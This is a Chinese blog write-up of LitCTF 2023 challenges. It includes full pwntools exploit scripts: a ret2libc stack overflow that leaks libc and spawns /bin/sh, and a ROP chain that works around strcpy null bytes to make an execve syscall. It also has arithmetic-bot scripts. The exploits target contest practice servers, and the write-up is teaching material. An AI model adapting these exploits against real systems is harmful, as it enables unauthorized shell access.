---
title: LitCTF2023
description: 和大家一起打的一场比赛！
pubDatetime: 2023-05-28
published: true
ogImage: ../../assets/5.png
language: cn
tags:
  - 网络安全
---
## 只需要nc一下
```python
echo $FLAG
NSSCTF{ea3b8681-9bee-43a6-86c9-b07f986e16fe}
```
> 这种题，先看dockerfile，能在docker里面出现dockerfile，就是骗你的。
> dockerfile必定出现在环境外面。
> 所以，可以理解为里面还有一个环境吧？
> 我们现在也在这样的一个环境里面，再次按此操作，即可得flag
> 环境变量就是flag

```python
Welcome to the virtual terminal!
ls
Dockerfile
app.py
cat Dockerfile
FROM python:3.11

COPY . /app

ENV FLAG=NSSCTF{123456}

RUN echo $FLAG > /flag.txt 

WORKDIR /app

EXPOSE 5000
CMD ["python", "app.py"]

```
dockerfile解释：<br />这是一个 Dockerfile 文件，它用于构建 Docker 镜像。下面逐行解释每个命令的含义：
```
FROM python:3.11
```
该命令表示将使用 python:3.11 镜像作为基础镜像。
```dockerfile
COPY . /app
```
该命令表示将当前目录下的所有文件复制到镜像内的 /app 目录中。
```
ENV FLAG=NSSCTF{123456}
```
该命令表示设置环境变量 FLAG 的值为 NSSCTF{123456}。这个环境变量可以在后续的命令中使用。
```dockerfile
RUN echo $FLAG > /flag.txt
```
该命令表示在容器中执行命令 echo $FLAG，并将其输出保存到 /flag.txt 文件中。由于之前设置了 FLAG 环境变量的值为 NSSCTF{123456}，所以该命令实际上将 NSSCTF{123456} 写入了 /flag.txt 文件中。
```dockerfile
WORKDIR /app
```
该命令表示设置工作目录为 /app 目录。
```
EXPOSE 5000
```
该命令表示将容器内部的 5000 端口暴露出来，允许外部网络连接到该端口。
> 这种做法是错误的，不愧是大佬。。。

```python
find / -name "flag.txt"
/flag.txt
cat /flag.txt
NSSCTF{123456}
```
## 狠狠的溢出涅
> 记得栈对齐，忘记多少字节了，直接ljust填充

```python
payload1=b""
payload1 = payload1.ljust(offset,b'\x00')
```
```python
from pwn import *
from LibcSearcher import *
io = remote('node5.anna.nssctf.cn',28610)
#io = process('./pwn4')
#context.log_level ='debug'
elf = ELF('./pwn4')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 0x68
pop_rdi = 0x4007d3

payload1=b""
payload1 = payload1.ljust(offset,b'\x00')
payload1 +=   p64(pop_rdi) + p64(puts_got) +  p64(puts_plt) + p64(main_addr)

io.sendline(payload1)

io.recvuntil(b'Ok,Message Received\n')
puts_addr = u64(io.recv(6,timeout=1).ljust(8,b'\x00'))
print(hex(puts_addr))

libc = ELF('./libc-2.31.so')
#libc = elf.libc

base = puts_addr - libc.symbols['puts']

system_addr = base +  	libc.symbols['system']
binsh_addr  = base +  next(libc.search(b'/bin/sh'))

payload2 =b""
payload2 = payload2.ljust(offset,b'\x00')
payload2 +=  p64(pop_rdi) + p64(binsh_addr) + p64(0x400556) + p64(system_addr) 

io.sendline(payload2)
io.interactive()
```
## 口算题
> 逐行提前脚本即可

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1683948627718-479be0d6-8402-4e56-9e7f-e19a2ed68750.png#averageHue=%23070605&clientId=u1dcc2805-9fd4-4&from=paste&height=628&id=u30ed2af0&originHeight=942&originWidth=1461&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182454&status=done&style=none&taskId=u0f9496d6-c3b6-47b0-a6e5-b564068a9ff&title=&width=974)
```python
from pwn import *
context(log_level='debug',arch='amd64',os='linux')

p = remote("node5.anna.nssctf.cn",28591)

while(1):
    p.recvuntil("What is ")
    a = p.recvuntil(" ")
    b = p.recvuntil(" ")
    c = p.recvuntil("?")
    c = c[:-1]
    a = int(a)
    c = int(c)

    print(a)
    print(b)
    print(c)

    if b"-" in b:
        h = a-c
        print(str(h))
        p.send(str(h))
        print("success")

    if b"+" in b:
        h = a + c
        print(str(h))
        p.send(str(h))
        print("success")



p.interactive()
```
其他万能脚本
```c
from pwn import *
import re
context.log_level = 'debug'
#io=process("./")
io=remote("node6.anna.nssctf.cn",28273)
#elf=ELF
r = lambda : io.recv()
rx = lambda x: io.recv(x)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)
uu64= lambda : u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x, y: io.sendafter(x, y)
sla = lambda x, y: io.sendlineafter(x, y)
shell = lambda : io.interactive()
#libc=elf.libc
r()
while(1):
	a=r()
	a_str = a.decode('utf-8')
	print(a)
	expression = re.search(r'\d+\s*[-+*\/]\s*\d+', a_str).group()
	result = eval(expression)
	print(result)
	sl(str(result))
	sleep(0.3)
shell()
```
## ezlogin
[pwn4.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/29466846/1684201772614-e8b66dfc-6589-42d5-8676-a232ff476e19.pdf?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2023%2Fpdf%2F29466846%2F1684201772614-e8b66dfc-6589-42d5-8676-a232ff476e19.pdf%22%2C%22name%22%3A%22pwn4.pdf%22%2C%22size%22%3A329517%2C%22ext%22%3A%22pdf%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u6c8a610c-df99-4b37-8caf-a2a3bcf982c%22%2C%22taskType%22%3A%22upload%22%2C%22type%22%3A%22application%2Fpdf%22%2C%22__spacing%22%3A%22both%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22ufef37b2a%22%2C%22margin%22%3A%7B%22top%22%3Atrue%2C%22bottom%22%3Atrue%7D%2C%22card%22%3A%22file%22%7D)
> zip文件

[https://blog.csdn.net/zzq487782568/article/details/127778545](https://blog.csdn.net/zzq487782568/article/details/127778545)
> 解决，\x00的问题
> 从后往前覆盖去修正
> 注意：提前字节，用切片

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684236171644-b58d3622-b6d5-4701-9f37-5b447d3be753.png#averageHue=%23080603&clientId=ub07849b2-3189-4&from=paste&height=196&id=u6734b106&originHeight=324&originWidth=1020&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=39649&status=done&style=none&taskId=uce2b6497-7b0b-43aa-b682-b02d23a2230&title=&width=618.1817824518735)<br />参考学习：[https://blog.csdn.net/zzq487782568/article/details/127778545](https://blog.csdn.net/zzq487782568/article/details/127778545)<br />有个栈溢出，然而这道题的坑点是strcpy遇到\x00就截止了，因此我不得不自己写了个发送函数使得从长往短覆盖。
> 因为一开始我使用ropchain构造rop链，所以后续的思路也使用rop先写入/bin/sh，后调用系统调用getshell

```python
from pwn import *
context(log_level = 'debug',arch = 'amd64')
io=process("./pwn4")
#io=remote("node5.anna.nssctf.cn",28596)

elf=ELF("./pwn4")
libc=elf.libc

rdi=0x400706
rdx=0x448c95
rsi=0x410043
syscall=0x4012bc
ret=0x400416
rax=0x4005af

def debug(x):
	if(x == 1):
		gdb.attach(io)
		pause()
	else:
		pause()

def sendbuf(payload): #覆盖写
	backup=b""
	for i in range(len(payload), -1, -1):  
		if(payload[i:i+1]==b'\x00'): #当前是\x00，直接发送
			fake = b'a' * 0x108 +b'a'*(i)+ payload[i:i+1]
			sleep(0.2)
			io.send(fake)
		elif((payload[i:i+1]!=b'\x00' and payload[i-1:i]==b'\x00') or i==0): #当前不是0，而前面是0
			fake = b'a' * 0x108 +b'a'*(i)+payload[i:i+1]+backup #补满前面
			sleep(0.2)
			io.send(fake)
			backup=b""
		else: #收录后一次性发出
			temp=backup 
			backup=payload[i:i+1]+temp 

def jumpout(): #跳出
	io.send(b"PASSWORD\x00")

#用ropchain写入/bin/sh，回到start函数开始
p=b''
p += pack(0x0000000000410043) # pop rsi ; ret
p += pack(0x00000000006b90e0) # @ .data
p += pack(0x00000000004005af) # pop rax ; ret
p += b'/bin//sh'
p += pack(0x000000000047f341) # mov qword ptr [rsi], rax ; ret
p += pack(0x0000000000410043) # pop rsi ; ret
p += pack(0x00000000006b90e8) # @ .data + 8
p+=p64(0x400ab0)
sendbuf(p)
jumpout()

#写入syscall
payload = p64(rdi)+p64(0x6b90e0)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(59)+p64(syscall)
sendbuf(payload)
jumpout()

io.interactive()
```
